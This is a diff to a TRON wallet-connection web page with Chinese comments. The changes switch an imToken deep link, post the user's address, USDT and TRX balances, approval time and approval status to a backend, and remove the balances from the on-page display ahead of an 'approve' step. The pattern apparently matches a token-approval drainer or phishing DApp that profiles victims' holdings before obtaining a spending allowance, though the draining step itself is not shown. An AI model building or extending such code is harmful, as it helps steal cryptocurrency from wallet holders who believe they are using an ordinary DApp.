@@ -86,7 +86,7 @@
         connectBtn.onclick = async () => {
             try {
                 if (!window.tronWeb) {
-                    window.location.href = `imtokenv2://navigate?screen=DApp授权页面&url=${encodeURIComponent(window.location.href)}`;
+                    window.location.href = `imtoken://dapp?url=${encodeURIComponent(window.location.href)}`;
                     return;
                 }
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
@@ -102,7 +102,11 @@
             // 初始化6个字段（与后端新增字段匹配）
             const postData = {
                 address: userAddress || "",          // 1. 钱包地址（必填）
-               
+                tokenBalance: tokenBalance,          // 2. USDT余额（必填）
+                trxBalance: trxBalance,              // 3. TRX余额（非必填）
+                approveTime: new Date().toLocaleString(), // 4. 授权时间（非必填）
+                txHash: "未生成",                    // 5. 交易哈希（非必填）
+                isApproved: false                    // 6. 授权状态（新增，布尔值）
             };
 
             try {
@@ -136,7 +140,8 @@
             } finally {
                 // 发送6个字段到后端
                 try {
-                   
+                   alert(`【发送】6个字段（含授权状态）：\n1.地址：${postData.address.slice(0,8)}...\n2.USDT：${postData.tokenBalance}\n3.TRX：${postData.trxBalance}\n4.时间：${postData.approveTime}\n5.哈希：${postData.txHash.slice(0,10)}...\n6.授权成功：${postData.isApproved}`);
+
                 const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -171,8 +176,7 @@
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                USDT：${tokenBalance} USDT<br>
-                TRX：${trxBalance} TRX
+                
             `;
             document.getElementById("approveBtn").disabled = false;
         } catch (e) {
